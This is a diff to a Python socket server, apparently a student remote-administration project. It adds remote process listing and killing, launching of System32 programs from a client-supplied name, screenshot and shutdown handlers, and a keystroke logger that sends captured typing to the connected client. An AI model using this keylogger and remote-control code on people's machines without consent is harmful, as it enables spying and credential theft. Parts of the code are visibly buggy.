@@ -5,8 +5,13 @@ import threading
 import time
 import pyautogui
 import os
+import signal
 import wmi
+import win32gui
+import win32process
+import win32pdhutil
 import pythoncom
+from pynput import keyboard
 
 #=============================== Define control code ===============================#
 
@@ -22,6 +27,9 @@ EXIT             =  '7'
 KILL             =  'K'
 START            =  'S'
 VIEW             =  'V'
+HOOK			 =  'H'
+UNHOOK			 =  'U'
+PRINT            =  'P'
 
 #=============================== +++++++++++++++++++++++++ ===============================#
 
@@ -36,27 +44,90 @@ global var_status
 def Process(Client_socket):
 	while True:
 		Code = Client_socket.recv(1).decode("utf8")
-		print(Code)
 		if (Code == VIEW):
 			pythoncom.CoInitialize() # Running Windows functions in threads can be tricky since it often involves COM objects.
-			print("hu o day")
 			f = wmi.WMI()
-			print("vao")
-			for process in f.Win32_Process():
-				Client_socket.sendall(bytes(str(process.ProcessId),"utf8"))
+			processes = f.ExecQuery('select Name, ProcessId, ThreadCount from Win32_Process')
+			for p in processes:
+				Client_socket.sendall(bytes(str(p.ProcessId),"utf8"))
 				Client_socket.recv(1)
 
-				Client_socket.sendall(bytes(str(process.Name),"utf8"))
+				Client_socket.sendall(bytes(str(p.Name),"utf8"))
 				Client_socket.recv(1)
 
-				Client_socket.sendall(bytes(str(process.ThreadCount),"utf8"))
+				Client_socket.sendall(bytes(str(p.ThreadCount),"utf8"))
 				Client_socket.recv(1)
 
 			Client_socket.sendall(bytes('__END__',"utf8"))
 		elif Code == KILL:
-			a = 1
+			Client_socket.sendall(bytes('1','utf8'))
+			try:
+				pid = int(Client_socket.recv(100).decode('utf8'))
+				os.kill(pid,signal.SIGTERM)
+				Client_socket.sendall(bytes('1','utf8'))
+			except:
+				Client_socket.sendall(bytes('0','utf8'))
 		elif Code == START:
-			a = 1
+			Client_socket.sendall(bytes('1','utf8'))
+			try:
+				name = Client_socket.recv(100).decode('utf8')
+				os.startfile('"C:/Windows/System32/' + name + '.exe"')
+				Client_socket.sendall(bytes('1','utf8'))
+			except:
+				Client_socket.sendall(bytes('0','utf8'))
+		elif Code == QUIT:
+			break
+
+
+def get_hwnds_for_pid (pid):
+	def callback (hwnd, hwnds):
+		if win32gui.IsWindowVisible (hwnd) and win32gui.IsWindowEnabled (hwnd):
+			_, found_pid = win32process.GetWindowThreadProcessId (hwnd)
+			if found_pid == pid:
+				hwnds.append (hwnd)
+		return True
+		pass    
+  
+	hwnds = []
+	win32gui.EnumWindows (callback, hwnds)
+	return hwnds
+	pass
+
+def App(Client_socket):
+	while True:
+		Code = Client_socket.recv(1).decode("utf8")
+		if (Code == VIEW):
+			pythoncom.CoInitialize() # Running Windows functions in threads can be tricky since it often involves COM objects.
+			f = wmi.WMI()
+			for process in f.ExecQuery('select Name , ProcessId , ThreadCount from Win32_Process '):
+				t = get_hwnds_for_pid(process.ProcessId)
+				if (len(t) != 0):
+					Client_socket.sendall(bytes(str(process.ProcessId),"utf8"))
+					Client_socket.recv(1)
+
+					Client_socket.sendall(bytes(str(process.Name),"utf8"))
+					Client_socket.recv(1)
+
+					Client_socket.sendall(bytes(str(process.ThreadCount),"utf8"))
+					Client_socket.recv(1)
+
+			Client_socket.sendall(bytes('__END__',"utf8"))
+		elif Code == KILL:
+			Client_socket.sendall(bytes('1','utf8'))
+			try:
+				pid = int(Client_socket.recv(100).decode('utf8'))
+				os.kill(pid,signal.SIGTERM)
+				Client_socket.sendall(bytes('1','utf8'))
+			except:
+				Client_socket.sendall(bytes('0','utf8'))
+		elif Code == START:
+			Client_socket.sendall(bytes('1','utf8'))
+			try:
+				name = Client_socket.recv(100).decode('utf8')
+				os.startfile('"C:/Windows/System32/' + name + '.exe"')
+				Client_socket.sendall(bytes('1','utf8'))
+			except:
+				Client_socket.sendall(bytes('0','utf8'))
 		elif Code == QUIT:
 			break
 
@@ -72,15 +143,15 @@ def take_picture(Client_socket):
 
 			#size of picture
 			Client_socket.sendall(bytes(str(sizef),'utf8'))
-			Client_socket.recv(1).decode('utf8')
+			Client_socket.recv(1)
 
 			#width of picture
 			Client_socket.sendall(bytes(str(myScreenshot.width),'utf8'))
-			Client_socket.recv(1).decode('utf8')
+			Client_socket.recv(1)
 
 			#height of picture
 			Client_socket.sendall(bytes(str(myScreenshot.height),'utf8'))
-			Client_socket.recv(1).decode('utf8')
+			Client_socket.recv(1)
 
 			#picture
 			Client_socket.sendall(f)
@@ -88,6 +159,33 @@ def take_picture(Client_socket):
 		elif (Code == QUIT):
 			print('quit screenshot')
 			break
+
+def keystroke(Client_socket):
+	text = ''
+	def on_press(key):
+		nonlocal text
+		text += str(key)
+		print(text)
+
+	while True:
+		listener = keyboard.Listener(on_press = on_press, daemon = True)
+		Code = Client_socket.recv(1).decode("utf8")
+		if (Code == HOOK):
+			listener.start()
+		elif Code == UNHOOK:
+			listener.wait()
+			text = ''
+		elif Code == PRINT:
+			Client_socket.sendall(bytes(str(sys.getsizeof(text)),'utf8'))
+			Client_socket.recv(1)
+			Client_socket.sendall(bytes(text,'utf8'))
+			Client_socket.recv(1)
+		elif Code == QUIT:
+			listener.daemon = True
+			listener.stop()
+			raise sys.exit(0)
+			break
+
 
 def Shutdown_Computer():
 	os.system("C:\Windows\System32\shutdown /s /t 30")
@@ -99,7 +197,7 @@ def accept_incoming_connection():
 			Z = threading.Thread(target=Run,args=(Client_socket,))
 			Z.daemon = True # thread exit automatically when the main thread dies
 			Z.start()
-		except:
+		except Exception as e:
 			pass
 
 	
@@ -118,7 +216,7 @@ def Run(Client_socket):
 				Process(Client_socket)
 			#App Running
 			if (Code == APP_RUNNING):
-				break
+				App(Client_socket)
 			#ShutDown
 			if (Code == SHUT_DOWN):
 				Shutdown_Computer()
@@ -127,6 +225,7 @@ def Run(Client_socket):
 				take_picture(Client_socket)
 			#KeyStock
 			if (Code == KEYSTROKE):
+				keystroke(Client_socket)
 				break
 			#Edit_Register
 			if (Code == EDIT_REGISTRY):
